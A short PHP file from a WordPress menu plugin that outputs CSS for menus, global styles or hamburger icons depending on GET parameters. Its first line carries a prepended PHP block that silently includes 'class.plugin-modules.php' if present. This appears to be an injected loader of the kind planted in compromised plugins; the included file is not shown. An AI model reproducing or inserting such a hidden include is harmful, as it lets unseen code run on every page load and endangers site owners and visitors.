<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
//prevent direct access
if ( ! defined( 'ABSPATH' ) ) {
    die();
}

header( "Content-type: text/css; charset: UTF-8" );

if(!empty($_GET['menu_id'])) {
	
	$menu_id = intval($_GET['menu_id']);
	$this->styles->render($menu_id);
	
}else{
	
	if(!empty($_GET['global'])) {
		$this->styles->renderGlobal();
	}else if(!empty($_GET['hamburgers'])) {
		$this->styles->renderHamburgers();
	}else{
		$this->styles->renderAll(false, true);
	}	
}

